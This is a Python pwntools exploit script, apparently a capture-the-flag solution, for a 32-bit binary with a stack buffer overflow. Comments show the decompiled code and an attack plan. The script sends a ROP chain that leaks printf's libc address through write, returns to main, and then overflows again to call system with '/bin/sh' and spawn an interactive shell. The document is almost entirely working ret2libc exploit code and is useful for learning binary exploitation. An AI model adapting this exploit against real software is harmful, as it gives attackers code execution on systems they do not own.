#!/usr/bin/env python

from pwn import *

s = process('./32_chal', env={'LD_PRELOAD':'./libc.so.6'})

#int __cdecl main(int argc, const char **argv, const char **envp)
#{
# int v4; // [sp+1Ch] [bp-64h]@1
#
#  write(1, "Hello pwners, \n", 0x10u);
#  read(0, &v4, 200u);
#  printf("%s", &v4);
#  return 0;
#}

#    Arch:     i386-32-little
#    RELRO:    Partial RELRO
#    Stack:    No canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x8048000)


#NX - enabled => ROP

# PLAN:
# 1 - Overflow the buffer
# 2 - Using ROP to leak GOT addresses with write function and return to main
# 3 - Overflow the buffer again and jump to system with /bin/sh as argument

#root@kali:~/Desktop# pattern.py 250
#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
#root@kali:~/Desktop# pattern.py 0x64413764
#Pattern 0x64413764 first occurrence at position 112 in pattern.

elf = ELF('32_chal')
rop = ROP(elf)
read_addr = elf.symbols['read']
# Found read in ELF
log.info("Read: {}".format(hex(read_addr)))

printf_addr = elf.symbols['printf']
log.info("Printf: {}".format(hex(printf_addr)))


#08049ffc R_386_GLOB_DAT    __gmon_start__
#0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0
#0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
#0804a014 R_386_JUMP_SLOT   __gmon_start__
#0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
#0804a01c R_386_JUMP_SLOT   write@GLIBC_2.0

read_got = elf.got['read']
log.info("Read Got: {}".format(hex(read_got)))
write_got = elf.got['write']

# if you want to jump and execute a function from libc you jump into PLT but if you want to 
# leak an address from libc you get the value from the GOT address.

libc = ELF('libc.so.6')
padding = 112
write_plt = elf.plt['write']
printf_got = elf.got['printf']

#print 'write_plt = ', hex(write_plt)
#print 'printf_got =', hex(printf_got)

# gdb ./32_chal
# b *main
main_addr = 0x804847d

# Leaking printf address:
# it's 32 elf so arguments are placed right on stack (not in registers liek in 64)

# write address which is exist in got table for printf function (could take some other function)
# in standart output and return to main afterwards

# 0x0 - stdin, 0x1 - stdout, 0x2 - stderr

# ssize_t write(int fildes, const void *buf, size_t nbytes);
# call function
# put return address
# put arg 1
# put arg 2
# put arg 3
ropchain = ''
ropchain += p32(write_plt)          # WRITE function "call"
ropchain += p32(main_addr)          # RETURN TO MAIN
ropchain += p32(0x1)                # 1 - standart output
ropchain += p32(printf_got)         # PRINTF ADDRESS ARG[1]
ropchain += p32(0x4)                # BYTES TO READ ARG[2] - 4 - length of int value in 32 architecture

#print 112 + len(ropchain)
#print 'A' * padding + ropchain

print s.recvline()
s.sendline('A' * padding + ropchain)
#print s.recv(112 + len(ropchain))
#print s.recv(0x4)

#print  s.recvline()[1:-15]]
#print hex(u32(s.recvline()[1:-15]))     #0xf7e68020
printf_addr = u32(s.recvline()[1:-15])
#print 'printf_addr = ', hex(printf_addr)


libc_real = printf_addr - libc.symbols['printf']
system_real = libc_real + libc.symbols['system']
#print 'system_real = ', hex(system_real)


# strings -a -t x libc.so.6 | grep '/bin/sh'
# 15900b /bin/sh
bin_sh_address = libc_real + 0x15900b

ropchain2 = p32(system_real)      
ropchain2 += 'BBBB'               # Return address doesn't really matter to where we return after shell
ropchain2 += p32(bin_sh_address)

payload = 'A' * (padding - 8) + ropchain2     # this -8 was found from gdb somehow (or guessed)
#print payload

s.sendline(payload)
s.interactive()

































